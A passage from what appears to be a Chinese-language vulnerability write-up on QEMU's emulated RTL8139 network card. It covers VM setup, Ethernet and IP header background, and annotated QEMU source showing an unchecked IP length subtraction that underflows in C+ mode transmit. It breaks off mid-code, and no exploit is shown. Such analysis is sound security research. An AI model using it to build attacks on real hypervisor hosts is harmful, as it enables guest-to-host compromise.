</span></span></code></pre></td></tr></table></div></div><p>如果出现以下错误，给文件 <code>commands-posix.c</code> 增加头文件 <code>&lt;sys/sysmacros.h></code> 即可解决。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>/usr/bin/ld: qga/commands-posix.o: in <span class=k>function</span> <span class=sb>`</span>dev_major_minor<span class=s1>&#39;:
</span></span></span><span class=line><span class=cl><span class=s1>/repo/qemu/qga/commands-posix.c:640: undefined reference to `major&#39;</span>
</span></span><span class=line><span class=cl>/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to <span class=sb>`</span>minor<span class=err>&#39;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=制作qemu虚拟机>制作QEMU虚拟机<a hidden class=anchor aria-hidden=true href=#制作qemu虚拟机>#</a></h3><p>这里我使用的Ubuntu 16.04 Server i386作为QEMU客户机系统。点击<a href=https://mirrors6.tuna.tsinghua.edu.cn/ubuntu-releases/xenial/ubuntu-16.04.6-server-i386.iso>下载</a>。</p><p>还需要下载安装VNC-Viewer，稍后会用到。<a href=https://www.realvnc.com/en/connect/download/viewer/linux/>链接</a>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./qemu-img create -f qcow2 ~/tmp/vm/ubuntu.img 10G
</span></span><span class=line><span class=cl>$ sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb
</span></span><span class=line><span class=cl>$ x86_64-softmmu/qemu-system-x86_64 -boot d -cdrom <span class=se>\ </span> <span class=c1># 能用嵌套虚拟就用(添加--enable-kvm)</span>
</span></span><span class=line><span class=cl>~/tmp/iso/ubuntu-16.04.6-server-i386.iso <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-hda ~/tmp/vm/ubuntu.img -m <span class=m>1024</span>
</span></span><span class=line><span class=cl>$ vncviewer host:port  <span class=c1># 连接上，安装就好</span>
</span></span></code></pre></td></tr></table></div></div><p>（尽量使用&ndash;enable-kvm，否则卡的受不了，安装系统安了四五个小时。。。）</p><h2 id=前置知识>前置知识<a hidden class=anchor aria-hidden=true href=#前置知识>#</a></h2><h3 id=网络>网络<a hidden class=anchor aria-hidden=true href=#网络>#</a></h3><p>因为涉及到了网卡，而且产生漏洞是数据包长度溢出所导致，所以需要了解一定的网络知识，可以看下面来复习一下。</p><p>OSI(Open Systems Interconnection)将网络协议分为7层，从上往下依次是：</p><ul><li>应用层</li><li>表示层</li><li>会话层</li><li>传输层</li><li>网络层</li><li>数据链路层</li><li>物理层</li></ul><p>而现实中使用的TCP/IP协议是5层的，依次是：</p><ol><li><p>应用层，是网络应用程序及其应用层协议存留的地方。因特网的应用层包括许多协议，常见的有HTTP(它为web文档提供了请求和传送)、SMTP(它提供了电子邮件报文的传输)和FTP(它提供了两个端系统之间的文件传送)。</p></li><li><p>传输层，负责为信源和信宿提供应用程序<strong>进程</strong>（包括同一终端上的不同进程）间的数据传输服务，这一层上主要定义了两个传输协议，传输控制协议即TCP和用户数据报协议UDP。</p></li><li><p>网络层，负责将数据报独立地从信源发送到信宿，主要解决路由选择、拥塞控制和网络互联等问题。</p></li><li><p>数据链路层，负责将IP数据报封装成合适在物理网络上传输的帧格式并传输，或将从物理网络接收到的帧解封，取出IP数据报交给网络层。</p></li><li><p>物理层，负责将<strong>比特流</strong>在结点间传输，即负责物理传输。该层的协议既与链路有关也与传输介质有关。</p></li></ol><p><img alt=TCPIP loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/imgTCPIP.jpg></p><p>IP数据包(IPv4)头部长度为20-60字节，TCP报文头部长度也是20-60字节。</p><h4 id=以太网帧>以太网帧<a hidden class=anchor aria-hidden=true href=#以太网帧>#</a></h4><p>在以太网链路上的数据包称作以太帧。以太帧起始部分由前导码和帧开始符组成。后面紧跟着一个以太网报头，以MAC地址说明目的地址和源地址。帧的中部是该帧负载的包含其他协议报头的数据包(例如IP协议)。以太帧由一个32位冗余校验码结尾。它用于检验数据传输是否出现损坏。</p><p><img alt=EthernetFrame loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/imgEthernetFrame.png></p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>前同步码</td><td>用来使接收端的适配器在接收 MAC 帧时能够迅速调整时钟频率，使它和发送端的频率相同。前同步码为 7 个字节，1 和 0 交替。</td></tr><tr><td>帧开始定界符</td><td>帧的起始符，为 1 个字节。前 6 位 1 和 0 交替，最后的两个连续的 1 表示告诉接收端适配器：“帧信息要来了，准备接收”。</td></tr><tr><td>目的地址</td><td>接收帧的网络适配器的物理地址（MAC 地址），为 6 个字节（48 比特）。作用是当网卡接收到一个数据帧时，首先会检查该帧的目的地址，是否与当前适配器的物理地址相同，如果相同，就会进一步处理；如果不同，则直接丢弃。</td></tr><tr><td>源地址</td><td>发送帧的网络适配器的物理地址（MAC 地址），为 6 个字节（48 比特）。</td></tr><tr><td>类型</td><td>上层协议的类型。由于上层协议众多，所以在处理数据的时候必须设置该字段，标识数据交付哪个协议处理。例如，字段为 0x0800 时，表示将数据交付给 IP 协议。</td></tr><tr><td>数据</td><td>也称为效载荷，表示交付给上层的数据。以太网帧数据长度最小为 46 字节，最大为 1500 字节。如果不足 46 字节时，会填充到最小长度。最大值也叫最大传输单元（MTU）。 在 Linux 中，使用 ifconfig 命令可以查看该值，通常为 1500。</td></tr><tr><td>帧检验序列 FCS</td><td>检测该帧是否出现差错，占 4 个字节（32 比特）。发送方计算帧的循环冗余码校验（CRC）值，把这个值写到帧里。接收方计算机重新计算 CRC，与 FCS 字段的值进行比较。如果两个值不相同，则表示传输过程中发生了数据丢失或改变。这时，就需要重新传输这一帧。</td></tr></tbody></table><h4 id=ip数据报>IP数据报<a hidden class=anchor aria-hidden=true href=#ip数据报>#</a></h4><p><img alt=ipdata loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/imgipdata.png></p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>版本号</td><td>占用4位二进制数，表示该IP数据报使用的IP协议版本。目前Internet中使用的主要是TCP/IP协议族中版本号为4的IP协议。</td></tr><tr><td>首部长度</td><td>占用4位二进制位，此域指出整个报头的长度（包括选项），该长度是<strong>以32位二进制数为一个计数单位</strong>的，接收端通过此域可以计算出报头在何处结束及从何处开始读数据。普通IP数据报（没有任何选项）该字段的值是5（即20个字节的长度）。</td></tr><tr><td>服务类型(TOS, Type Of Service)</td><td>占用8位二进制位，用于规定本数据报的处理方式。</td></tr><tr><td>总长度</td><td>占用16位二进制位，总长度字段是指整个IP数据报的长度（报头区+数据区），以字节为单位。</td></tr><tr><td>标识</td><td>占16位（第二行四个字节中1~15位），它是一个计数器，用来产生数据报的标识，即每产生一个数据报贴上一个标识。</td></tr><tr><td>标志</td><td>目前只有前两位有意义。<br>标志字段的最低位是 <strong>MF</strong> (More Fragment)。MF = 1 表示后面“还有分片”。<strong>MF</strong> = 0 表示最后一个分片。<br>标志字段中间的一位是 <strong>DF</strong> (Don&rsquo;t Fragment) 。只有当 DF = 0 时才允许分片。</td></tr><tr><td>片偏移</td><td>较长的分组在分片后某片在原分组中的相对位置。片偏移以 8 个字节为偏移单位。</td></tr><tr><td>TTL</td><td>Time To Live，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。</td></tr></tbody></table><h3 id=rtl8139>RTL8139<a hidden class=anchor aria-hidden=true href=#rtl8139>#</a></h3><p>RTL8139被用在许多古老或者廉价的设备中，支持10/100MBit。支持的速率较慢，但由于它的简洁性，如今它广泛被用在虚拟化环境中。这也使得它的驱动程序比较简单，所以通常是OS开发爱好者们的第一个设备。它支持两种接收发送(Receive/Transmit)模式：C mode和C+ mode。vender ID: 0x10EC，device ID: 0x8139。</p><p>QEMU中模拟的RTL8139，对应的结构为<code>RTL8139State</code>(位于文件<code>hw/net/rtl8139.c:435</code>)。</p><p><code>RTL8139State</code>结构体中许多的字段就是RTL8139网卡内部的寄存器，关于这些寄存器的描述，可以参考厂商Realtek提供的Datesheet。下图为RTL8139在C+模式下寄存器的介绍：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>        +---------------------------+----------------------------+
</span></span><span class=line><span class=cl>0x00    |           MAC0            |            MAR0            |
</span></span><span class=line><span class=cl>        +---------------------------+----------------------------+
</span></span><span class=line><span class=cl>0x10    |                       TxStatus0                        |
</span></span><span class=line><span class=cl>        +--------------------------------------------------------+
</span></span><span class=line><span class=cl>0x20    |                        TxAddr0                         |
</span></span><span class=line><span class=cl>        +-------------------+-------+----------------------------+
</span></span><span class=line><span class=cl>0x30    |        RxBuf      |ChipCmd|                            |
</span></span><span class=line><span class=cl>        +-------------+------+------+----------------------------+
</span></span><span class=line><span class=cl>0x40    |   TxConfig  |  RxConfig   |            ...             |
</span></span><span class=line><span class=cl>        +-------------+-------------+----------------------------+
</span></span><span class=line><span class=cl>        |                                                        |
</span></span><span class=line><span class=cl>        |             skipping irrelevant registers              |
</span></span><span class=line><span class=cl>        |                                                        |
</span></span><span class=line><span class=cl>        +---------------------------+--+------+------------------+
</span></span><span class=line><span class=cl>0xd0    |           ...             |  |TxPoll|      ...         |
</span></span><span class=line><span class=cl>        +-------+------+------------+--+------+--+---------------+
</span></span><span class=line><span class=cl>0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |
</span></span><span class=line><span class=cl>        +-------+------+------------+------------+---------------+
</span></span></code></pre></td></tr></table></div></div><ul><li>TxConfig：发送数据相关的配置参数</li><li>RxConfig：接收数据相关的配置参数</li><li>CpCmd：C+ 模式相关配置参数，比如：<ul><li>CplusRxEnd 表示启用接收</li><li>CplusTxEnd 表示启用发送</li></ul></li><li>TxAddr0：Tx descriptors table 相关的物理内存地址<ul><li>0x20 ~ 0x27：Transmit Normal Priority Descriptors Start Address</li><li>0x28 ~ 0x2F：Transmit High Priority Descriptors Start Address</li></ul></li><li>RxRingAddrLO：Rx descriptors table 物理内存地址低 32 位</li><li>RxRingAddrHI：Rx descriptors table 物理内存地址高 32 位</li><li>TxPoll：让网卡检查 Tx descriptors</li></ul><p>关于 <code>Descriptor</code>(<strong>Tx缓冲区是网卡的发送数据缓冲区，而Rx缓冲区则是接收数据缓冲区。Tx表以及Rx表为一个16字节结构体大小的数组，该表中的<code>Descriptor</code>包含缓冲区的具体位置)</strong> 的定义，同样可以参考厂商 Realtek 提供的 Datasheet 手册，下图为 <code>Transmit Descriptor</code> 的定义：</p><p><img alt=rtl8139_txdescriptor loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/imgrtl8139_txdescriptor.png></p><p>Phrack的文章[4]中将其定义为（这是为了方便设置的，QEMU中并不存在这个结构）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>rtl8139_desc</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>dw0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>dw1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>buf_lo</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>buf_hi</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=漏洞分析>漏洞分析<a hidden class=anchor aria-hidden=true href=#漏洞分析>#</a></h2><p>漏洞出现网卡的C+模式中，文件位于<code>hw/net/rtl8139.c:1827</code>中的函数<code>rtl8139_cplus_transmit_one</code>中</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>rtl8139_cplus_transmit_one</span><span class=p>(</span><span class=n>RTL8139State</span> <span class=o>*</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// .......
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=cm>/* Now decide if descriptor being processed is holding the last segment of packet */</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>txdw0</span> <span class=o>&amp;</span> <span class=n>CP_TX_LS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>saved_buffer</span>  <span class=o>=</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>cplus_txbuffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span>      <span class=n>saved_size</span>    <span class=o>=</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>cplus_txbuffer_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span>      <span class=n>saved_buffer_len</span> <span class=o>=</span> <span class=n>s</span><span class=o>-&gt;</span><span class=n>cplus_txbuffer_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>txdw0</span> <span class=o>&amp;</span> <span class=p>(</span><span class=n>CP_TX_IPCS</span> <span class=o>|</span> <span class=n>CP_TX_UDPCS</span> <span class=o>|</span> <span class=n>CP_TX_TCPCS</span> <span class=o>|</span> <span class=n>CP_TX_LGSEN</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode offloaded task checksum</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=cm>/* ip packet header */</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_header</span> <span class=o>*</span><span class=n>ip</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kt>int</span> <span class=n>hlen</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kt>uint8_t</span>  <span class=n>ip_protocol</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kt>uint16_t</span> <span class=n>ip_data_len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>eth_payload_data</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kt>size_t</span>   <span class=n>eth_payload_len</span>  <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=c1>// 这里saved_buffer其实就是以太网帧
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=kt>int</span> <span class=n>proto</span> <span class=o>=</span> <span class=nf>be16_to_cpu</span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>uint16_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>saved_buffer</span> <span class=o>+</span> <span class=mi>12</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>proto</span> <span class=o>==</span> <span class=n>ETH_P_IP</span><span class=p>)</span>  <span class=c1>// 检查以太网中的Type，即上层协议类型
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode has IP packet</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=cm>/* not aligned */</span>
</span></span><span class=line><span class=cl>                <span class=c1>// 跳过以太网帧头，到达IP数据报
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=n>eth_payload_data</span> <span class=o>=</span> <span class=n>saved_buffer</span> <span class=o>+</span> <span class=n>ETH_HLEN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>eth_payload_len</span>  <span class=o>=</span> <span class=n>saved_size</span>   <span class=o>-</span> <span class=n>ETH_HLEN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>ip</span> <span class=o>=</span> <span class=p>(</span><span class=n>ip_header</span><span class=o>*</span><span class=p>)</span><span class=n>eth_payload_data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nf>IP_HEADER_VERSION</span><span class=p>(</span><span class=n>ip</span><span class=p>)</span> <span class=o>!=</span> <span class=n>IP_HEADER_VERSION_4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode packet has bad IP version %d &#34;</span>
</span></span><span class=line><span class=cl>                        <span class=s>&#34;expected %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>IP_HEADER_VERSION</span><span class=p>(</span><span class=n>ip</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                        <span class=n>IP_HEADER_VERSION_4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=n>ip</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>hlen</span> <span class=o>=</span> <span class=nf>IP_HEADER_LENGTH</span><span class=p>(</span><span class=n>ip</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=n>ip_protocol</span> <span class=o>=</span> <span class=n>ip</span><span class=o>-&gt;</span><span class=n>ip_p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=c1>// vulnerability here
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=c1>// 完全信任了用户所提供的IP数据报的头长度和数据长度
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=c1>// ip_data_len为uint16_t类型
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=c1>// 当be16_to_cpu(ip-&gt;ip_len) &lt; hlen时，就会发生溢出
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=c1>// 最大0xFFFF
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=n>ip_data_len</span> <span class=o>=</span> <span class=nf>be16_to_cpu</span><span class=p>(</span><span class=n>ip</span><span class=o>-&gt;</span><span class=n>ip_len</span><span class=p>)</span> <span class=o>-</span> <span class=n>hlen</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// ......
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>该函数中，计算IP数据报的数据长度时，没有对总长度<code>ip->ip_len</code>和头长度<code>hlen</code>进行校验，在恶意构造为<code>ip->ip_len &lt; heln</code>时，就会发生溢出。在此函数中的后面，因为长度过长就会使用<code>rtl8139_transfer_frame</code>进行分片发送：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>rtl8139_cplus_transmit_one</span><span class=p>(</span><span class=n>RTL8139State</span> <span class=o>*</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// .......
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>((</span><span class=n>txdw0</span> <span class=o>&amp;</span> <span class=n>CP_TX_LGSEN</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>ip_protocol</span> <span class=o>==</span> <span class=n>IP_PROTO_TCP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>large_send_mss</span> <span class=o>=</span> <span class=p>(</span><span class=n>txdw0</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>CP_TC_LGSEN_MSS_MASK</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>DPRINTF</span><span class=p>(</span><span class=s>&#34;+++ C+ mode offloaded task TSO MTU=%d IP data %d &#34;</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;frame data %d specified MSS=%d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ETH_MTU</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>ip_data_len</span><span class=p>,</span> <span class=n>saved_size</span> <span class=o>-</span> <span class=n>ETH_HLEN</span><span class=p>,</span> <span class=n>large_send_mss</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>tcp_send_offset</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>send_count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* maximum IP header length is 60 bytes */</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint8_t</span> <span class=n>saved_ip_header</span><span class=p>[</span><span class=mi>60</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* save IP header template; data area is used in tcp checksum calculation */</span>
</span></span><span class=line><span class=cl>        <span class=nf>memcpy</span><span class=p>(</span><span class=n>saved_ip_header</span><span class=p>,</span> <span class=n>eth_payload_data</span><span class=p>,</span> <span class=n>hlen</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* a placeholder for checksum calculation routine in tcp case */</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>data_to_checksum</span>     <span class=o>=</span> <span class=n>eth_payload_data</span> <span class=o>+</span> <span class=n>hlen</span> <span class=o>-</span> <span class=mi>12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=c1>//                    size_t   data_to_checksum_len = eth_payload_len  - hlen + 12;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=cm>/* pointer to TCP header */</span>
</span></span><span class=line><span class=cl>        <span class=n>tcp_header</span> <span class=o>*</span><span class=n>p_tcp_hdr</span> <span class=o>=</span> <span class=p>(</span><span class=n>tcp_header</span><span class=o>*</span><span class=p>)(</span><span class=n>eth_payload_data</span> <span class=o>+</span> <span class=n>hlen</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>tcp_hlen</span> <span class=o>=</span> <span class=nf>TCP_HEADER_DATA_OFFSET</span><span class=p>(</span><span class=n>p_tcp_hdr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* ETH_MTU = ip header len + tcp header len + payload */</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 这里利用了上面计算得出的ip_data_len
